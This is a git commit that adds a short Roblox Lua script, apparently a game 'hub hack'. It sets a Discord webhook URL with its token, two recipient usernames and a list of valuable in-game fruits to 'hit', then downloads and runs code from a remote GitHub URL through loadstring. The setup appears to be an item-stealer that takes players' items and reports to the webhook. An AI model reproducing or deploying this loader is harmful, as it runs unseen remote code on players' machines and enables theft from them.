6d20aadb0630973e4d9d024528b135b58e8fbcab
cokka-hub-hacks <rajveersingh4372@gmail.com>
2025-03-26 14:14:32 +0530

    Create Cokka.lua

---
+++ Cokka.lua
@@ -0,0 +1,7 @@
+Webhook = "https://discord.com/api/webhooks/1322095601458085931/z1LC4jgwWfY-yl-WtVcjuzEbaSTHQFcwS-L_BpziHg4aryPApiNZhRDx5fl5WxtRZi14"
+Usernames = {"Rajbloxveer", "MokshyaaZ"}
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Buddha-Buddha", "Gravity-Gravity", "Control-Control", "Shadow-Shadow", "Spirit-Spirit"}  
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
+
+
+
